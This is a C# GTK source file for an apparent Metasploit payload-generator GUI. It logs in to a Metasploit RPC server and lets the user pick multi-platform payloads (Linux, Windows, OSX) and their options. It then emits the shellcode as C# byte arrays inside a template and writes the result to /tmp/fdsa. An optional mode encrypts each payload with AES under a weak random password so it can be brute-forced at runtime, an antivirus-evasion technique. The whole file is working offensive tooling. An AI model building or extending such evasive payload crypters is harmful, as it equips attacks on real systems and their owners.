using System;
using System.Linq;
using Gtk;
using metasploitsharp;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Reflection;
using System.IO;

public partial class MainWindow: Gtk.Window
{
	MetasploitSession _session = null;
	MetasploitManager _manager = null;
	CheckButton _encrypted = new CheckButton ("Encrypted?");
	VBox _main = null;
	Dictionary<string, object> _payloads = null;
	List<VBox> _dynamicOptions = new List<VBox> ();
	List<TreeView> _treeViews = new List<TreeView> ();
	Notebook _parentNotebook = null;
	Dictionary<string, Dictionary<string, object>> _newPayloads = new Dictionary<string, Dictionary<string, object>> ();
	SymmetricAlgorithm _algorithm = new RijndaelManaged ();
	Random _random = new Random();

	public MainWindow () : base (Gtk.WindowType.Toplevel)
	{
		this.Resize (600, 100);

		_main = new VBox ();

		HBox title = new HBox ();
		title.PackStart (new Label ("Login to your Metasploit RPC instance to begin"), true, true, 0);

		_main.PackStart (title, true, true, 0);

		HBox loginInfo = new HBox ();

		loginInfo.PackStart (new Label ("Host:"), false, false, 20);

		Entry hostEntry = new Entry ();
		loginInfo.PackStart (hostEntry, false, false, 0);

		loginInfo.PackStart (new Label ("User:"), false, false, 20);

		Entry userEntry = new Entry ();
		loginInfo.PackStart (userEntry, false, false, 0);

		loginInfo.PackStart (new Label ("Pass:"), false, false, 20);

		Entry passEntry = new Entry ();
		loginInfo.PackStart (passEntry, false, false, 0);

		_main.PackStart (loginInfo, true, true, 0);

		Button login = new Button ("Login");

		login.Clicked += (object sender, EventArgs e) => {
			try {
				Console.WriteLine ("Creating session");
				_session = new MetasploitSession (userEntry.Text, passEntry.Text, hostEntry.Text);
				Console.WriteLine ("Creating manager and getting current list of payloads");
				_manager = new MetasploitManager (_session);
				_payloads = _manager.GetPayloads ();
				BuildWorkspace ();
			} catch (Exception ex) {
				Console.WriteLine ("oh noes, login failed " + ex.ToString ());
			}
		};

		HBox loginBox = new HBox ();
		loginBox.PackStart (login, false, false, 300);

		_main.PackStart (loginBox, true, true, 0);

		_main.ShowAll ();
		this.Add (_main);
	}

	protected void BuildWorkspace ()
	{
		this.Remove (_main);
		_main = null;
		this.Resize (800, 600);

		_main = new VBox ();

		_parentNotebook = new Notebook ();

		AddPlatformTab ("Linux x86", "linux/x86", _parentNotebook);
		AddPlatformTab ("Linux x86-64", "linux/x64", _parentNotebook);
		AddPlatformTab ("Windows x86", "windows", _parentNotebook, "x64");
		AddPlatformTab ("Windows x86-64", "windows/x64", _parentNotebook);
		AddPlatformTab ("OSX x86", "osx/x86", _parentNotebook);
		AddPlatformTab ("OSX x86-64", "osx/x64", _parentNotebook);

		_main.PackStart (_parentNotebook, false, false, 10);

		HBox buttons = new HBox ();

		_encrypted.TooltipText = "Encrypted payloads will be bruteforced at runtime";
		buttons.PackStart (_encrypted, false, false, 0);

		Button generate = new Button ("Generate");

		generate.Clicked += HandleClicked;

		Button close = new Button ("Close");

		buttons.PackEnd (close, false, false, 10);
		buttons.PackEnd (generate, false, false, 10);
		_main.PackStart (buttons, false, false, 0);
		_main.ShowAll ();
		this.Add (_main);
	}

	void HandleClicked (object sender, EventArgs e)
	{
		string template = string.Empty;
		Assembly asm = Assembly.GetExecutingAssembly ();

		string rsrc = _encrypted.Active ? "MetasploitPayloadUtility.EncryptedTemplate.txt" : "MetasploitPayloadUtility.GeneralTemplate.txt";

		using (StreamReader rdr = new StreamReader(asm.GetManifestResourceStream(rsrc)))
			template = rdr.ReadToEnd ();

		string winx64Payload = "payload = new byte[][] {";
		string winx86Payload = winx64Payload;
		string linx86Payload = winx86Payload;
		string linx64Payload = linx86Payload;

		if (!_encrypted.Active) {
			foreach (var pair in _newPayloads) {
				pair.Value ["Format"] = "csharp";
				var response = _manager.ExecuteModule ("payload", pair.Key, pair.Value);

				if (pair.Key.StartsWith ("linux/x86") || pair.Key.StartsWith("osx/x86")) {
					linx86Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
				} else if (pair.Key.StartsWith ("linux/x64") || pair.Key.StartsWith("osx/x64")) {
					linx64Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
				} else if (pair.Key.StartsWith ("windows/x64")) {
					winx64Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
				} else { /*windows x86*/
					winx86Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
				}
			}

			winx64Payload += "};";
			winx86Payload += "};";
			linx64Payload += "};";
			linx86Payload += "};";

			Console.WriteLine (winx64Payload);
			Console.WriteLine (winx86Payload);
			Console.WriteLine (linx64Payload);
			Console.WriteLine (linx86Payload);
		} else {
			foreach (var pair in _newPayloads) {
				pair.Value ["Format"] = "raw";
				var response = _manager.ExecuteModule ("payload", pair.Key, pair.Value);

				if (pair.Key.StartsWith ("linux/x86") || pair.Key.StartsWith("osx/x86")) {
					linx86Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
				} else if (pair.Key.StartsWith ("linux/x64") || pair.Key.StartsWith("osx/x64")) {
					linx64Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
				} else if (pair.Key.StartsWith ("windows/x64")) {
					winx64Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
				} else { /*windows x86*/
					winx86Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
				}
			}

			winx64Payload += "};";
			winx86Payload += "};";
			linx64Payload += "};";
			linx86Payload += "};";

			Console.WriteLine (winx64Payload);
			Console.WriteLine (winx86Payload);
			Console.WriteLine (linx64Payload);
			Console.WriteLine (linx86Payload);
		}

		template = template.Replace("{{lin64}}", linx64Payload);
		template = template.Replace("{{lin86}}", linx86Payload);
		template = template.Replace("{{win64}}", winx64Payload);
		template = template.Replace("{{win86}}", winx86Payload);

		File.WriteAllText("/tmp/fdsa", template);
	}

	protected void AddPlatformTab (string friendlyName, string msfPayloadFilter, Notebook parent, string negativeFilter = null, Widget payloadDetails = null)
	{
		HBox split = new HBox ();

		TreeView payloads = new TreeView ();

		TreeViewColumn no = new TreeViewColumn ();
		no.Title = "#";
		CellRendererText noText = new CellRendererText ();
		no.PackStart (noText, true);
		no.AddAttribute (noText, "text", 0);

		TreeViewColumn treedeets = new TreeViewColumn ();
		payloads.AppendColumn (no);

		CellRendererText treeDeetsText = new CellRendererText ();

		treedeets.Title = "Details";
		treedeets.PackStart (treeDeetsText, true);
		treedeets.AddAttribute (treeDeetsText, "text", 1);
		payloads.AppendColumn (treedeets);

		ListStore payloadListStore = new ListStore (typeof(string), typeof(string));

		payloads.Model = payloadListStore;

		payloads.WidthRequest = 250;
		payloads.HeightRequest = 500;

		_treeViews.Add (payloads);

		split.PackStart (payloads, false, false, 10);
		VBox deetsAndButtons = new VBox ();
		VBox deets = new VBox ();

		HBox payloadComboContainer = new HBox ();
		ComboBox payloadCombo = ComboBox.NewText ();
		payloadCombo.Changed += OnPayloadChanged;
		payloadCombo.WidthRequest = 250;

		var ps = ((List<object>)_payloads ["modules"]).Where (s => ((string)s).StartsWith (msfPayloadFilter));

		if (negativeFilter != null)
			ps = ps.Where (s => !((string)s).Contains (negativeFilter));

		foreach (var payload in ps.OrderBy(s => s)) 
			payloadCombo.AppendText (payload.ToString ());

		payloadComboContainer.PackStart (payloadCombo, false, false, 0);

		deetsAndButtons.PackStart (payloadComboContainer, false, false, 0);
		deetsAndButtons.PackStart (deets, false, false, 0);

		if (payloadDetails != null)
			deets.PackStart (payloadDetails, false, false, 0);
			
		_dynamicOptions.Add (deets);
		split.PackEnd (deetsAndButtons, true, true, 0);
		parent.AppendPage (split, new Label (friendlyName));
	}

	protected void OnPayloadChanged (object o, EventArgs e)
	{
		VBox payloadDetails = _dynamicOptions [_parentNotebook.CurrentPage];

		foreach (Widget widget in payloadDetails.Children)
			payloadDetails.Remove (widget);

		ComboBox combo = (ComboBox)o;
		TreeIter iter;

		Dictionary<string, object> opts = null;
		if (combo.GetActiveIter (out iter))
			opts = _manager.GetModuleOptions ("payload", ((ComboBox)o).Model.GetValue (iter, 0).ToString ());

		foreach (var opt in opts) {
			string optName = opt.Key as string;
			string type = string.Empty;
			string defolt = string.Empty;
			string required = string.Empty;
			string advanced = string.Empty;
			string evasion = string.Empty;
			string desc = string.Empty;
			string enums = string.Empty;

			foreach (var optarg in opt.Value as Dictionary<string, object>) {

				switch (optarg.Key) {
				case "default":
					defolt = optarg.Value.ToString ();
					break;
				case "type":
					type = optarg.Value.ToString ();
					break;
				case "required":
					required = optarg.Value.ToString ();
					break;
				case "advanced":
					advanced = optarg.Value.ToString ();
					break;
				case "evasion":
					evasion = optarg.Value.ToString ();
					break;
				case "desc":
					desc = optarg.Value.ToString ();
					break;
				case "enums":
					enums = optarg.Value.ToString ();
					break;
				default:
					throw new Exception ("Don't know option argument: " + optarg.Key);
				}
			}

			payloadDetails.PackStart (CreateWidget (optName, type, defolt, desc), false, false, 0);
		}

		HBox addBox = new HBox ();
		Button addPayload = new Button ("Add payload");
		addPayload.Clicked += (object sender, EventArgs es) => { 
			int n = _treeViews [_parentNotebook.CurrentPage].Model.IterNChildren ();
			Dictionary<string, object> newopts = new Dictionary<string, object> ();
			foreach (Widget child in _dynamicOptions[_parentNotebook.CurrentPage].Children) {
				if (child is CheckButton)
					newopts.Add ((child as CheckButton).Label, (child as CheckButton).Active.ToString ());
				else if (child is HBox) {
					foreach (Widget c in (child as HBox).Children) {
						if (c is Entry)
							newopts.Add ((c as Entry).TooltipText, (c as Entry).Text);
					}
				}
			}

			TreeIter i; 
			((ComboBox)o).GetActiveIter (out i);

			_newPayloads.Add (((ComboBox)o).Model.GetValue (i, 0).ToString (), newopts);

			((ListStore)_treeViews [_parentNotebook.CurrentPage].Model).AppendValues ((n + 1).ToString (), ((ComboBox)o).Model.GetValue (iter, 0).ToString ());

			CellRendererText tx = new CellRendererText ();
			_treeViews [_parentNotebook.CurrentPage].Columns [1].PackStart (tx, true);
			_treeViews [_parentNotebook.CurrentPage].ShowAll ();
		};
		addBox.PackStart (addPayload, false, false, 0);
		payloadDetails.PackStart (addBox, false, false, 0);
		payloadDetails.ShowAll ();
	}

	Widget CreateWidget (string optName, string type, string defolt, string desc)
	{
		if (type == "bool") { 
			CheckButton button = new CheckButton (optName);
			button.TooltipText = desc;
			if (defolt == "True")
				button.Activate ();
			return button;
		} else if (type == "string" || type == "address" || type == "port" || type == "integer" || type == "raw" || type == "path" || type == "enum") {
			Entry textbox = new Entry (defolt);
			textbox.WidthRequest = 150;
			textbox.TooltipText = optName;
			HBox box = new HBox ();
			Label optNameLabel = new Label (optName);
			optNameLabel.TooltipText = desc;
			optNameLabel.SetAlignment (0f, 0.5f);
			optNameLabel.WidthRequest = 200;
			box.PackStart (optNameLabel, false, false, 0);
			box.PackStart (textbox, false, false, 10);

			return box;
		} else
			throw new Exception ("WTF IS " + type);
	}

	protected void OnDeleteEvent (object sender, DeleteEventArgs a)
	{
		Application.Quit ();
		a.RetVal = true;
	}

	private byte[] EncryptData (byte[] data, string password)
	{
		GetKey (password);

		ICryptoTransform encryptor = _algorithm.CreateEncryptor ();
		byte[] cryptoData = encryptor.TransformFinalBlock (data, 0, data.Length);

		return cryptoData;
	}

	private void GetKey (string password)
	{
		byte[] salt = new byte[8];
		byte[] passwordBytes = Encoding.ASCII.GetBytes (password);
		int length = Math.Min (passwordBytes.Length, salt.Length);

		for (int i = 0; i < length; i++)
			salt [i] = passwordBytes [i];

		Rfc2898DeriveBytes key = new Rfc2898DeriveBytes (password, salt);

		_algorithm.Key = key.GetBytes (_algorithm.KeySize / 8);
		_algorithm.IV = key.GetBytes (_algorithm.BlockSize / 8);
	}

	private string GetByteArrayString (byte[] data)
	{
		string str = string.Empty;
		StringBuilder bld = new StringBuilder ();
		bld.Append ("new byte[] {");
		foreach (byte b in data)
			bld.AppendFormat ("0x{0:x2},", b);
		bld.Append ("},");
		str = bld.ToString ();
		return str;
	}
}
